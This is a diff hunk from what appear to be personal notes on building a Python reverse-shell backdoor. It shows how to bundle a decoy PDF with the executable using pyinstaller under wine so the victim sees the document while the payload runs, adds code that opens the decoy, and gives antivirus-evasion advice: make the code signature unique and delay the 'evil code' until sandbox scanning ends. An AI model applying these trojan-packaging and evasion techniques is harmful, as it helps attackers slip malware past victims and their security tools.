@@ -601,6 +601,17 @@ os.remove('rev_bacldoor.exe')
 but again the above requires that the target has an internet connection and the attacker has a domain to get the requests.
 better option is to package the jpg/pdf along with the packaged exe. its easy with pyinstaller in wine.
 wine full/path/to/pyinstaller.exe --add-data "path/to/pdf:." --onefile --noconsole rev_backdoor.py  # pdf is what is shown to user while execution
+file_name = sys.__MEIPASS + '\filename.pdf'
+subprocess.Popen(file_name, shell=True)
+
+So far we didnt care about detection by antivirus. hence evasion is important.
+antivirus works by 2 concepts 1)code - compare against large db of signatures   # just need to make core unique ideally it will be unless reused 
+2)behaviour - run in sandbox and analyze it. #they are gonna see if the file tries to modify registry values or open a port. harder to bypass
+run trusted code before evil code and delay the execution of evil code hoping AV would quit scanning before that.
+
+
+
+
 
 
 
